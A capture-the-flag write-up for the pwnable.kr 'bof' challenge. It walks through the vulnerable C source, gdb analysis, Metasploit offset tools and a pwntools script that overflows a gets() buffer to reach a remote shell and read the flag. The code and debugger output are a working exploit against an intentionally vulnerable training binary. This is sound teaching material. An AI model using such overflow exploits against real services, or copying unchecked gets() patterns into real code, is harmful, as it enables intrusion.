# Pwnable.kr BOF 

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000


# Download of files

```sh
root@kali:~/CTF/BOF# wget http://pwnable.kr/bin/bof
--2017-03-22 19:47:13--  http://pwnable.kr/bin/bof
Resolving pwnable.kr (pwnable.kr)... 143.248.249.64
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7348 (7.2K)
Saving to: ‘bof’

bof                 100%[===================>]   7.18K  --.-KB/s    in 0s      

2017-03-22 19:47:28 (326 MB/s) - ‘bof’ saved [7348/7348]

root@kali:~/CTF/BOF# wget http://pwnable.kr/bin/bof.c
--2017-03-22 19:47:33--  http://pwnable.kr/bin/bof.c
Resolving pwnable.kr (pwnable.kr)... 143.248.249.64
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 308 [text/x-csrc]
Saving to: ‘bof.c’

bof.c               100%[===================>]     308  --.-KB/s    in 0s      

2017-03-22 19:47:33 (18.9 MB/s) - ‘bof.c’ saved [308/308]

```


# Check security

```sh
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
gdb-peda$
```

# Check file. 32 bit

```sh
root@kali:~/CTF/BOF# file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

# Check out the source. Buffer of 32

```sh
root@kali:~/CTF/BOF# cat bof.c 
```
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

# Determine code execution primitive

```sh
root@kali:~/CTF/BOF# python -c 'print "A"*100'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@kali:~/CTF/BOF# ./bof
overflow me : 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Nah..
*** stack smashing detected ***: ./bof terminated
Segmentation fault

```

# Break after overflow

```sh
root@kali:~/CTF/BOF# gdb bof
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.
gdb-peda$ pdisas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
gdb-peda$ break *func+40
Breakpoint 1 at 0x654

```

# Check registers, EAX contains pattern.

```sh
gdb-peda$ pattc 36
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA'
gdb-peda$ run
Starting program: /root/CTF/BOF/bof 
overflow me : 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA

 [----------------------------------registers-----------------------------------]
EAX: 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
EBX: 0x0 
ECX: 0xfbad2288 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b2db0 
EBP: 0xffffd368 --> 0xffffd388 --> 0x0 
ESP: 0xffffd320 --> 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
EIP: 0x56555654 (<func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e59fb0 <gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
   0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:	call   0xf7e35840 <system>
   0x56555669 <func+61>:	jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
0004| 0xffffd324 --> 0xffffd3c4 --> 0x6f9418ef 
0008| 0xffffd328 --> 0xf7fae000 --> 0x1b2db0 
0012| 0xffffd32c --> 0xd ('\r')
0016| 0xffffd330 --> 0xffffffff 
0020| 0xffffd334 --> 0xf7fae000 --> 0x1b2db0 
0024| 0xffffd338 --> 0xf7e07e18 --> 0x2bb6 
0028| 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555654 in func ()
```

# Check for system pointer & ESP to EAX pointer

```sh
[----------------------------------registers-----------------------------------]
EAX: 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
EBX: 0x0 
ECX: 0xfbad2288 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b2db0 
EBP: 0xffffd368 --> 0xffffd388 --> 0x0 
ESP: 0xffffd320 --> 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
EIP: 0x5655565b (<func+47>:	jne    0x5655566b <func+63>)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e59fb0 <gets>
   0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
=> 0x5655565b <func+47>:	jne    0x5655566b <func+63>
 | 0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
 | 0x56555664 <func+56>:	call   0xf7e35840 <system>
 | 0x56555669 <func+61>:	jmp    0x56555677 <func+75>
 | 0x5655566b <func+63>:	mov    DWORD PTR [esp],0x565557a3
 |->   0x5655566b <func+63>:	mov    DWORD PTR [esp],0x565557a3
       0x56555672 <func+70>:	call   0xf7e5a880 <puts>
       0x56555677 <func+75>:	mov    eax,DWORD PTR [ebp-0xc]
       0x5655567a <func+78>:	xor    eax,DWORD PTR gs:0x14
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
0004| 0xffffd324 --> 0xffffd3c4 --> 0x3fa1763e 
0008| 0xffffd328 --> 0xf7fae000 --> 0x1b2db0 
0012| 0xffffd32c --> 0xd ('\r')
0016| 0xffffd330 --> 0xffffffff 
0020| 0xffffd334 --> 0xf7fae000 --> 0x1b2db0 
0024| 0xffffd338 --> 0xf7e07e18 --> 0x2bb6 
0028| 0xffffd33c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x5655565b in func ()

```

# Determine offsets

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 100 -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```sh
gdb-peda$ run
Starting program: /root/CTF/BOF/bof 
overflow me : 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

 [----------------------------------registers-----------------------------------]
EAX: 0xffffd33c ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
EBX: 0x0 
ECX: 0xfbad2288 
EDX: 0xf7faf87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b2db0 
EBP: 0xffffd368 ("4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
ESP: 0xffffd320 --> 0xffffd33c ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
EIP: 0x56555654 (<func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e59fb0 <gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
   0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:	call   0xf7e35840 <system>
   0x56555669 <func+61>:	jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0xffffd33c ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0004| 0xffffd324 --> 0xffffd3c4 --> 0x115132d6 
0008| 0xffffd328 --> 0xf7fae000 --> 0x1b2db0 
0012| 0xffffd32c --> 0xd ('\r')
0016| 0xffffd330 --> 0xffffffff 
0020| 0xffffd334 --> 0xf7fae000 --> 0x1b2db0 
0024| 0xffffd338 --> 0xf7e07e18 --> 0x2bb6 
0028| 0xffffd33c ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555654 in func ()
gdb-peda$ i r
eax            0xffffd33c	0xffffd33c
ecx            0xfbad2288	0xfbad2288
edx            0xf7faf87c	0xf7faf87c
ebx            0x0	0x0
esp            0xffffd320	0xffffd320
ebp            0xffffd368	0xffffd368
esi            0x1	0x1
edi            0xf7fae000	0xf7fae000
eip            0x56555654	0x56555654 <func+40>
eflags         0x246	[ PF ZF IF ]
cs             0x23	0x23
ss             0x2b	0x2b
ds             0x2b	0x2b
es             0x2b	0x2b
fs             0x0	0x0
gs             0x63	0x63
```
# EBP + 0x08 needs to be 0xcafebabe, offsets to EBP.

```sh
gdb-peda$ print /x 0xffffd368 + 0x8
$1 = 0xffffd370
gdb-peda$ x/40s 0xffffd370
0xffffd370:	"b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q b7Ab
[*] Exact match at offset 52
```

```sh
gdb-peda$ run
Starting program: /root/CTF/BOF/bof 
overflow me : 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAAAAAAAAAA
```
```sh
gdb-peda$ x/20s $ebp+0x8
0xffffd370:	"BBBB", 'A' <repeats 20 times>
```

# Exploit script

```py
#!/usr/bin/python
from pwn import *
import struct

# Shellcode
buffer = "\x90"*52 + struct.pack("<I", 0xcafebabe) + "\x90"*20

# Send Shellcode

expl = remote("pwnable.kr", 9000)
expl.send(buffer)

# Use Shell
expl.interactive()
```

# Flag

```sh
root@kali:~/CTF/BOF# ./exploit.py 
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
$ cat flag
daddy, I just pwned a buFFer :)
```
